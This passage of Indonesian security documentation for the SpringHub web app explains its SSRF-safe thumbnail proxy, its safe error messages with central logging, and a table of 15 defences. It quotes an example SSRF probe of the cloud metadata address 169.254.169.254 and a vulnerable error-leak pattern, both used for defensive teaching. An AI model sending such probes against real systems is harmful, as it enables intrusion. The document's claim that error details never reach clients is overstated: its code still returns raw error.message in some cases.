      const res = await fetch(imgUrl, { signal: controller.signal });
      clearTimeout(t);
      if (res.ok) {
        const buffer = await res.arrayBuffer();
        return new NextResponse(buffer, {
          status: 200,
          headers: {
            "Content-Type": res.headers.get("content-type") || "image/jpeg",
            "Cache-Control": "public, max-age=86400, s-maxage=86400",
            "Access-Control-Allow-Origin": "*",
          },
        });
      }
    } catch {
      continue;
    }
  }

  return new NextResponse(null, { status: 404 });
}
```

**Cerita bagaimana mitigasi menghentikan serangan:** Request penyerang
`?url=http://169.254.169.254/...` — parameter `url` tidak ada di kode.
Yang diterima hanyalah `videoId` dan `quality`, dan keduanya divalidasi
keras: `videoId` harus cocok `^[a-zA-Z0-9_-]{11}$` (persis 11 karakter
alphanumeric — format ID video YouTube; `169.254.169.254` jelas gagal
regex → 400), `quality` harus ada di daftar `SIZES` (selain itu fallback
`hqdefault`). URL tujuan TIDAK PERNAH berasal dari user: server yang
mengonstruksi `https://i.ytimg.com/vi/${videoId}/${size}.jpg` — hostname
hardcoded, satu-satunya variabel adalah ID yang sudah lolos whitelist
karakter. Request ke `i.ytimg.com` juga punya timeout 5 detik
(`AbortController`), dan response di-cache 1 hari — endpoint tidak bisa
dipakai untuk probing jaringan internal, tidak ada input yang menjadi URL.

---

## 10.15 Error Info Leak — Pesan Aman + Log Terpusat

### Kode yang rentan (contoh nyata dari repo)

Pola rentan: meneruskan `error.message` mentah ke client:

```ts
// CONTOH POLA RENTAN — stack trace & detail internal bocor ke response
// return NextResponse.json({ error: error.message, stack: error.stack }, { status: 500 });
// // Penyerang melihat: "Invalid value for argument `where.userId`. Expected String, got: undefined ..."
```

### Cerita serangan

Penyerang mengirim request yang sengaja memicu error (mis. ID berbentuk
aneh ke `/api/projects/xyz`, atau body yang melanggar skema) dan membaca
response error. Alih-alih pesan netral, server membalas dengan stack trace
Prisma: nama model (`Report`, `Profile`), nama kolom, bahkan potongan query
dan versi library. Informasi ini adalah amunisi emas: penyerang belajar
struktur database persis (nama tabel, relasi), versi framework yang
dipakai (untuk mencari CVE), dan kebiasaan developer. Dengan
`error instanceof Error → return error.message`, celah kecil di validasi
berubah menjadi peta serangan lengkap. Sekaligus, error itu tidak tercatat
di mana pun — tim tidak tahu sedang diserang.

### Mitigasi di SpringHub

```ts
// lib/prisma.ts baris 44-83 — getErrorMessage: pesan aman + log otomatis ke AppError
export function getErrorMessage(error: unknown, fallback = "Terjadi kesalahan. Silakan coba lagi."): string {
  // Log error ke AppError secara asynchronous
  if (error) {
    const msg = error instanceof Error ? error.message : String(error);
    const stack = error instanceof Error ? error.stack : "";
    import("@/lib/error-logger").then(({ logError }) => {
      logError({
        message: msg.slice(0, 500),
        level: "error",
        source: "api",
        stack: stack?.slice(0, 2000) || "",
        metadata: { fallback },
      }).catch(() => {});
    }).catch(() => {});
  }

  if (typeof error === "string") return error;
  if (error instanceof Prisma.PrismaClientKnownRequestError) {
    if (error.code === "P1001") return "Database tidak tersedia. Silakan coba lagi.";
    if (error.code === "P1002") return "Koneksi database timed out. Silakan refresh.";
    if (error.code === "P1017") return "Koneksi database terputus.";
    if (error.code === "P2002") return "Data sudah ada.";
    if (error.code === "P2025") return "Data tidak ditemukan.";
    return "Gangguan database. Silakan coba lagi.";
  }
  if (error instanceof Prisma.PrismaClientInitializationError) {
    return "Gagal terhubung ke database.";
  }
  if (error instanceof Prisma.PrismaClientRustPanicError) {
    return "Database error fatal.";
  }
  if (error instanceof Prisma.PrismaClientValidationError) {
    return "Data yang dikirim tidak valid.";
  }
  if (error instanceof SyntaxError) {
    return "Format request tidak valid.";
  }
  if (error instanceof Error) return error.message;
  return fallback;
}
```

```ts
// lib/error-logger.ts baris 30-78 — Error detail HANYA ke console + tabel AppError
export async function logError(input: ErrorLogInput): Promise<void> {
  const { message, level = "error", source = "frontend", stack = "", url = "", userId = "", metadata = {} } = input;

  // Always log to console regardless of environment
  const prefix = `[${level.toUpperCase()}][${source}]`;
  if (level === "critical") {
    console.error(prefix, message, metadata, stack);
  } else if (level === "error") {
    console.error(prefix, message, metadata);
  } else if (level === "warning") {
    console.warn(prefix, message, metadata);
  } else {
    console.log(prefix, message, metadata);
  }

  const payload = {
    level,
    message,
    source,
    stack: stack.slice(0, 2000), // limit stack trace length
    url: url.slice(0, 500),
    userId: userId.slice(0, 100),
    metadata: JSON.stringify(metadata).slice(0, 5000),
  };

  try {
    if (typeof window !== "undefined") {
      // Frontend — POST via fetch (fire-and-forget)
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 3000);
      await fetch("/api/log/error", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
    } else {
      // Server-side — import prisma directly
      const { prisma } = await import("@/lib/prisma");
      await prisma.appError.create({ data: payload }).catch((e: Error) => {
        console.error("[ErrorLogger] Failed to save to DB:", e.message);
      });
    }
  } catch (err) {
    // Silent fail — error logger tidak boleh bikin error baru
    console.debug("[ErrorLogger] Failed to send:", err);
  }
}
```

```ts
// app/api/courses/[slug]/route.ts baris 31-37 — Pola penggunaan di tiap route
  } catch (error) {
    console.error("Course fetch error:", error instanceof Error ? error.message : error);
    return NextResponse.json(
      { error: getErrorMessage(error, "Terjadi kesalahan.") },
      { status: isDatabaseError(error) ? 503 : 500 }
    );
  }
```

**Cerita bagaimana mitigasi menghentikan serangan:** Penyerang memicu error
dan membaca response — yang diterimanya hanyalah salah satu dari: "Database
tidak tersedia. Silakan coba lagi.", "Data sudah ada.", "Data tidak
ditemukan.", "Format request tidak valid.", atau fallback "Terjadi
kesalahan. Silakan coba lagi." — pesan ramah pengguna TANPA satu pun nama
model, kolom, atau stack trace. Detail teknis (`error.message` penuh,
`stack`) tidak pernah sampai ke client: `getErrorMessage` memotongnya ke
log internal (`console.error` + tabel `AppError` via `lib/error-logger.ts`),
yang bisa dilihat admin di halaman `/admin/errors`. `isDatabaseError()`
memetakan error DB ke status `503` (bukan 500) — penyerang tidak bisa
membedakan "DB down" dari "bug aplikasi" untuk perencanaan serangan lebih
lanjut. Semua nilai yang disimpan di-log pun dipotong (`stack.slice(0,2000)`,
`metadata.slice(0,5000)`) — logger sendiri tidak menjadi vektor penyimpanan
raksasa. Client-side, `setupGlobalErrorLogger()` meregistrasi handler
`window.onerror` + `unhandledrejection` — error frontend juga masuk tabel
yang sama, sehingga tim melihat serangan dari sisi browser.

---

## 10.16 Ringkasan: 15 Kerentanan → 15 Pertahanan

| # | Kerentanan | Pertahanan utama | File kunci |
|---|---|---|---|
| 1 | SQL Injection | Prisma parameterized + RLS extension | `lib/prisma.ts`, `lib/prisma-rls.ts` |
| 2 | XSS konten | DOMPurify 2 lapis di server | `lib/sanitize.ts`, `app/api/courses/[slug]/route.ts` |
| 3 | CSRF | JWT token cookie+header, just-in-time | `lib/csrf.ts`, `app/api/csrf/route.ts` |
| 4 | Brute force login | Rate limit + lockout 5×/15mnt + dummy hash + bcrypt 12 + rotasi | `lib/rate-limit.ts`, `app/api/auth/login/route.ts`, `lib/jwt.ts` |
| 5 | Payload raksasa | 83 field `.max(500)` + body limit nginx | `lib/forms.ts`, `nginx.conf` |
| 6 | Upload palsu | Magic bytes + re-encode sharp + EXIF strip | `lib/upload-photo.ts` |
| 7 | Webhook palsu | `timingSafeEqual` + idempotency + CAS atomic | `app/api/donations/webhook/route.ts` |
| 8 | Spam form | CSRF + time gate + honeypot + rate limit + 5/hari guest | `app/api/reports/route.ts`, `app/report/[slug]/page.tsx` |
| 9 | Privacy koordinat | Snap 5km server-side, presisi admin only | `lib/geo.ts`, `app/api/reports/route.ts` |
| 10 | Seed destruktif | Guard DB kosong + `SEED_FORCE` | `prisma/seed.ts` |
| 11 | Secret bocor | `.gitignore` berlapis + audit history | `.gitignore` |
| 12 | IP whitelist admin | Fail-closed middleware + `isAdminIpAllowed` | `middleware.ts`, `lib/auth.ts` |
| 13 | Session hijack | Cookie flags + SHA-256 ledger + revoke | `lib/auth.ts`, `lib/session-cache.ts` |
| 14 | SSRF proxy | Input whitelist regex + URL hardcoded server | `app/api/ytthumb/route.ts` |
| 15 | Error info leak | `getErrorMessage` aman + log terpusat | `lib/prisma.ts`, `lib/error-logger.ts` |

**Pola berulang yang menjadi filosofi keamanan SpringHub:**

1. **Server-side selalu** — validasi, sanitasi, snap koordinat, hitung poin:
   tidak ada yang dipercaya dari client.
2. **Fail-closed** — whitelist, webhook, seed: jika ragu, tolak.
3. **Berlapis** — nginx → middleware → route handler → Zod → Prisma → DB;
   setiap lapisan bisa menghentikan serangan sendirian.
4. **Idempotent & atomic** — webhook, retry offline, seed: efek samping
   dijalankan tepat sekali.
5. **Tidak ada rahasia di log** — kredensial dimask, stack dipotong, PII
   disaring sebelum logging.

Dengan 15 pertahanan ini, SpringHub menutup kelas serangan web yang paling
sering dieksploitasi — dari bot spam hingga pencurian kredensial — sambil
tetap menjaga data sensitif (koordinat mata air, data pribadi relawan)
hanya untuk yang berhak.
